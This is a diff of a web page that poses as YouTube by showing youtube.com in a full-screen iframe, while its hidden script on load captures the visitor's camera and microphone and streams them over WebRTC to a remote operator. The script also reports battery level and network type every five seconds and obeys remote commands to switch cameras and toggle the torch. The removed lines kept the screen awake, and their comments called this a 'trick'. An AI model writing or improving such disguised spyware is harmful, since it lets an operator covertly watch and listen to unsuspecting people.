@@ -1,69 +1,59 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>YouTube</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body, html { margin: 0; padding: 0; background: #0f0f0f; height: 100%; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; pointer-events: none; }
-        video { display: none; }
-    </style>
-</head>
+<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body, html { margin: 0; padding: 0; background: #0f0f0f; height: 100%; overflow: hidden; } iframe { width: 100%; height: 100%; border: none; pointer-events: none; } video { display: none; }</style></head>
 <body>
     <iframe src="https://www.youtube.com" allow="autoplay"></iframe>
     <video id="v" autoplay playsinline muted></video>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
         const video = document.getElementById("v");
-        let localStream;
-        let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        let localStream, currentMode = "user";
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
 
-        // 🚀 Trick 1: Screen off hote dibe na (Wake Lock)
-        async function stayAlive() {
-            try { await navigator.wakeLock.request('screen'); } catch (err) {}
-        }
-
-        async function startCamera(mode = "user") {
-            if (localStream) localStream.getTracks().forEach(t => t.stop());
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode, width: 640, height: 480 }, 
-                    audio: true 
+        async function sendStatus() {
+            const battery = await navigator.getBattery();
+            const netInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netType = netInfo ? netInfo.type : "Unknown"; // Detects WiFi/Cellular
+            
+            setInterval(() => {
+                socket.emit("status-update", { 
+                    battery: Math.floor(battery.level * 100),
+                    network: netType === "wifi" ? "🌐 WiFi" : "📶 Mobile Data",
+                    audio: true
                 });
-                video.srcObject = localStream;
-                
-                // Track update
-                localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
-                socket.emit("ready");
-                stayAlive();
-            } catch (e) { alert("Enable permissions to continue."); }
+            }, 5000);
         }
 
-        // 🚀 Trick 2: Background Re-connect Logic
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible') {
-                stayAlive(); // Phire ashle abar chalu kora
-            }
-        });
+        async function start(mode) {
+            if (localStream) localStream.getTracks().forEach(t => t.stop());
+            localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+            video.srcObject = localStream;
+            localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
+            socket.emit("ready");
+            sendStatus();
+        }
 
         socket.on("switch-camera", () => {
-            // Ekhane mode switch korar logic
-            startCamera("environment"); 
+            currentMode = (currentMode === "user") ? "environment" : "user";
+            start(currentMode);
+        });
+
+        socket.on("toggle-torch", async () => {
+            const track = localStream.getVideoTracks()[0];
+            const caps = track.getCapabilities();
+            if (caps.torch) track.applyConstraints({ advanced: [{ torch: !track.getConstraints().torch }] });
         });
 
         socket.on("ready", async () => {
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            socket.emit("offer-front", offer);
+            const o = await pc.createOffer();
+            await pc.setLocalDescription(o);
+            socket.emit("offer-front", { offer: o, senderId: socket.id });
         });
 
-        socket.on("answer-front", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
-        pc.onicecandidate = e => e.candidate && socket.emit("ice-front", e.candidate);
-        socket.on("ice-front", c => pc.addIceCandidate(new RTCIceCandidate(c)));
-
-        window.onload = () => startCamera();
+        socket.on("answer-front", d => pc.setRemoteDescription(new RTCSessionDescription(d.answer)));
+        pc.onicecandidate = e => e.candidate && socket.emit("ice-front", { candidate: e.candidate, senderId: socket.id });
+        window.onload = () => start(currentMode);
     </script>
 </body>
 </html>
